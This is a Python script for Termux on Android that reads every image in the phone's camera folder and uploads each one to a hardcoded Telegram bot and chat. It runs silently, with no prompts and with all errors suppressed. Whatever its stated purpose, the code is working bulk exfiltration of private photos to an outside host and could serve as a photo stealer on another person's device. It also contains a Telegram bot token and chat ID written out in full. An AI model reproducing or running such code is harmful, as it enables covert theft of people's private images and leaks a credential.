import os
import time
import requests

# =====================================================================
# ⚠️ CONFIGURATION (Fill this in once)
# =====================================================================
BOT_TOKEN = "8986334495:AAF81g6WggKZQpdNG0A-kAUR2age3T4FyFg"
CHAT_ID = "7387743481"

# Automatic path to your phone's default camera folder
PHOTO_DIR = "/data/data/com.termux/files/home/storage/dcim/Camera"
# =====================================================================

def send_photo(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(file_path, 'rb') as photo:
            payload = {'chat_id': CHAT_ID}
            files = {'photo': photo}
            response = requests.post(url, data=payload, files=files, timeout=30)
            return response.status_code == 200
    except:
        return False

def main():
    if not os.path.exists(PHOTO_DIR):
        return

    # Automatically scan for all common image formats
    valid_extensions = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
    try:
        files = [
            os.path.join(PHOTO_DIR, f) 
            for f in os.listdir(PHOTO_DIR) 
            if f.lower().endswith(valid_extensions)
        ]
    except:
        return

    # Loop through everything automatically without asking you
    for file_path in files:
        success = send_photo(file_path)
        
        # 1.5-second cooldown so Telegram doesn't block the bot
        time.sleep(1.5)

if __name__ == "__main__":
    main()
